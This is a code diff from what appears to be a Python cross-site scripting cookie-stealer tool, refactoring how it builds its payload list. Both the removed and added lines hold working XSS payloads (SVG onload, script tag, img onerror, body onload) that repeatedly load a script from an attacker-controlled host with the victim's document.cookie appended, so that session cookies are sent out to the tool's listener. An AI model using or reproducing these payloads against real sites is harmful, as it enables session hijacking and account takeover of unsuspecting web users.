@@ -64,19 +64,17 @@ secs = float(format(args.secs))
 target = args.target
 
 if len(target) > 0 and gene:
-    payload = '''
-    - SVG: <svg/onload=setInterval(function(){{with(document)body.appendChild(createElement("script")).src="//{0}/?"+document.cookie}},1010)>
-    - SCRIPT: <script>setInterval(function(){{with(document)body.appendChild(createElement("script")).src="//{0}/?"+document.cookie}},1010)</script>
-    - IMG: <img src=x onerror=setInterval(function(){{with(document)body.appendChild(createElement("script")).src="//{0}/?"+document.cookie}},1010)>
-    - BODY: <body onload=setInterval(function(){{with(document)body.appendChild(createElement("script")).src="//{0}/?"+document.cookie}},1010)></body>
-    '''.format(target)
+
+    source = "{0}".format(target)
 else:
-    payload = '''
-    - SVG: <svg/onload=setInterval(function(){{with(document)body.appendChild(createElement("script")).src="//{0}:{1}/?"+document.cookie}},1010)>
-    - SCRIPT: <script>setInterval(function(){{with(document)body.appendChild(createElement("script")).src="//{0}:{1}/?"+document.cookie}},1010)</script>
-    - IMG: <img src=x onerror=setInterval(function(){{with(document)body.appendChild(createElement("script")).src="//{0}:{1}/?"+document.cookie}},1010)>
-    - BODY: <body onload=setInterval(function(){{with(document)body.appendChild(createElement("script")).src="//{0}:{1}/?"+document.cookie}}></body>
-    '''.format(host, port)
+    source = "{0}:{1}".format(host, port)
+    
+payload = '''
+    - SVG: <svg/onload=setInterval(function(){{with(document)body.appendChild(createElement("script")).src="//{0}/?".concat(document.cookie)}},1010)>
+    - SCRIPT: <script>setInterval(function(){{with(document)body.appendChild(createElement("script")).src="//{0}/?".concat(document.cookie)}},1010)</script>
+    - IMG: <img src=x onerror=setInterval(function(){{with(document)body.appendChild(createElement("script")).src="//{0}/?".concat(document.cookie)}},1010)>
+    - BODY: <body onload=setInterval(function(){{with(document)body.appendChild(createElement("script")).src="//{0}/?".concat(document.cookie)}},1010)></body>
+    '''.format(source)
 
         
 form = b'''HTTP/1.1 200 OK
